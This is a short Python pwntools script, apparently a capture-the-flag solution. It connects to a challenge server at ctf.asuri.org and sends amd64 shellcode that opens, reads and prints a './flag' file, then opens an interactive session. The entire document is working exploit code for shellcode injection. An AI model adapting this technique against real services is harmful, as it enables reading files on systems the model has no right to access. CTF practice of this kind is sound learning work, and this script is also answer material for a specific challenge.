from pwn import * 

# sh = process('./1')
sh = remote('ctf.asuri.org', 10073)
context.log_level = 'debug'
context.arch = 'amd64'
# gdb.attach(sh)


shellcode = shellcraft.open('./flag')
shellcode += shellcraft.read(3,0x601180,0x20)
shellcode += shellcraft.write(1,0x601180,0x20)
# log.success(str(len(asm(shellcode))))
sh.sendafter('You can solve this ezez problem!\n', asm(shellcode))


sh.interactive()